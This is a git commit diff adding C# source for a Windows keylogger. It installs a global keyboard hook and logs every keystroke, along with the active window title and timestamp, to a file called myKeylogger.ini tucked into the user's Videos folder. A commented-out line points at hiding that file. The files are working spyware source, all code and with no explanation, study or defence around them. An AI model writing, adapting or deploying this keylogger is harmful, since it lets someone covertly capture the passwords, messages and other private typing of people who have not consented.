5bf05adbbaf2e1f0f797edba2f31340a837acbfe
khaitn1309 <khaitn1309@users.noreply.github.com>
2018-03-06 13:54:25 +0700

    a
    update

---
+++ keylog/keylog/Form1.cs
@@ -0,0 +1,57 @@
+﻿using MyKeylogger.Lib;
+using MyKeylogger.Lib.WinApi;
+using System;
+using System.IO;
+using System.Windows.Forms;
+using tt;
+
+namespace keylog
+{
+    public partial class Form1 : Form
+    {
+        //bat key
+        private readonly KeyboardHookListener keyListener;
+        private IntPtr lastActiveWindow = IntPtr.Zero;
+        private bool hasSubmitted;
+        private readonly KeyMapper keyMapper = new KeyMapper();
+        private readonly string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini";
+        public  Form1()
+        {
+            InitializeComponent();
+            Functions.CreateFile();
+            keyListener = new KeyboardHookListener(new GlobalHooker());
+            keyListener.KeyDown += KeyListener_KeyDown;
+
+        }
+
+        private void KeyListener_KeyDown(object sender, KeyEventArgs e)
+        {
+            if(lastActiveWindow != Functions.GetForegroundWindow())
+            {
+                var format = @"[""{0}"" {1}]" + Environment.NewLine + Environment.NewLine;
+                var text = string.Format(format, Functions.GetActiveWindowText(), DateTime.Now);
+                if(hasSubmitted)
+                {
+                    text = text.Insert(0, Environment.NewLine + Environment.NewLine);
+                }
+                File.AppendAllText(filePath, text);
+                hasSubmitted = true;
+                lastActiveWindow = Functions.GetForegroundWindow();
+            }
+            var keyText = keyMapper.GetKeyText(e.KeyCode);
+            File.AppendAllText(filePath, keyText);
+        }
+
+        protected override void OnLoad(EventArgs e)
+        {
+            base.OnLoad(e);
+            keyListener.Enabled = true;
+        }
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            base.OnFormClosing(e);
+            keyListener.Enabled = false;
+        }
+
+    }
+}
---
+++ keylog/keylog/Functions.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace tt
+{
+    public static class Functions
+    {
+        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+
+        public static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);
+        [DllImport("user32.dll")]
+
+        internal static extern short GetKeyState(Keys nVirtualKey);
+
+        public static bool IsToggled(this Keys key)
+        {
+            return GetKeyState(key) == 0x1;
+        }
+
+        public static bool IsKeyPressed(this Keys key)
+        {
+            var result = GetKeyState(key);
+            switch(result)
+            {
+                case 0: return false;
+                case 1: return false;
+                default: return true;
+            }
+        }
+
+        public static string GetActiveWindowText()
+        {
+            var handle = GetForegroundWindow();
+            var sb = new StringBuilder();
+            GetWindowText(handle, sb, 1000);
+            return sb.Length == 0 ? "UnhandleWindow" : sb.ToString();
+        }
+
+        public static void CreateFile()
+        {
+            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini"))
+                return;
+            File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini").Dispose();
+           // File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini", FileAttributes.Hidden);
+        }
+    }
+}
